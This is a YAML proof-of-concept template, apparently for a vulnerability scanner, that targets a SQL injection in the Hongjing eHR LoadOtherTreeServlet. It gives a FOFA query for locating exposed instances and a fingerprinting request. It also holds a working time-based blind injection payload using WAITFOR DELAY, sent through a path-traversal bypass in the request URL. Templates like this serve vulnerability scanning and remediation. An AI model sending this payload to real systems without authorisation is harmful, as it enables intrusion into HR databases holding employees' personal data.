id: poc-yaml-hongjing-ehr-loadothertreeservlet-sqli
info:
  name: 宏景eHR LoadOtherTreeServlet SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 宏景eHR
  fofa: app="HJSOFT-HCM"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /templates/index/hcmlogon.jsp
  expression: status_code == 200 && contains(body,"/css/hcm/login.css")
- method: GET
  path: /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--&flag=1
  expression: 'status_code == 200 &&

    contains(content_type,"text/xml") &&

    contains(body,"text=\"root\" title=\"root\"") &&

    duration > t1 &&

    duration < t2

    '
transport: http
